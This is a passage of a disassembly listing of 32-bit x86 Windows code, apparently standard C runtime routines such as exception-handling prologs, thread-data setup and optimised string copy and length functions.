  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
  423702:	call   0x4238a8
  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
  423e75:	and    edx,0xffff
  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
